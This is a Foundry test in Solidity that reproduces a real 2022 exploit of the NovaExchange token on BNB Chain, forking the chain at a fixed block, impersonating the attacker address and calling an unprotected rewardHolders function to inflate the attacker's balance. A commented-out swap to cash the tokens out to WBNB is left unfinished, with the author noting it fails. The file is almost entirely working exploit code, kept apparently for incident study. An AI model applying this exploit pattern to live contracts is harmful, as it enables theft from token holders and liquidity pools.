// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BeosinAlert/status/1601168659585454081
// @TX
// https://bscscan.com/tx/0xf743dba906255cf6f75f8243ef8192f2a211aacf03df99322584686b5c445c23
// forge test --contracts ./src/test/NovaExchange_exp.sol -vv

interface INovaExchange {
    function rewardHolders(uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);
}

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    INovaExchange novaContract = INovaExchange(0xB5B27564D05Db32CF4F25813D35b6E6de9210941);
    address attacker = 0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72;
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IPancakeRouter wbnb_nova = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)); // wbnb/nova Pair

    function setUp() public {
        cheats.createSelectFork("bsc", 23_749_678); //fork bsc at block number 23749678

        //novaContract.approve(address(wbnb_nova), type(uint256).max);
        //WBNB.approve(address(wbnb_nova), type(uint256).max);
    }

    function testExploit() public {
        emit log_named_uint("Before exploit, NOVA balance of attacker:", novaContract.balanceOf(attacker));

        cheats.prank(attacker);

        novaContract.rewardHolders(10_000_000_000_000_000_000_000_000_000);

        emit log_named_uint("After exploit,  NOVA balance of attacker:", novaContract.balanceOf(attacker));

        // address[] memory path2 = new address[](2);
        // path2[0] = address(novaContract);
        // path2[1] = address(WBNB);

        //I see [FAIL. Reason: Pancake: INSUFFICIENT_INPUT_AMOUNT] testExploit() (gas: 124976)
        //I am pretty sure the error has to do with the number of decimals of the NOVA token
        //Not sure how to fix it
        // wbnb_nova.swapExactTokensForETH(
        //     10000000000020000000000000000,
        //     361966603954705498098,
        //     path2,
        //     attacker,
        //     1670570010
        // );
    }

    receive() external payable {}
}
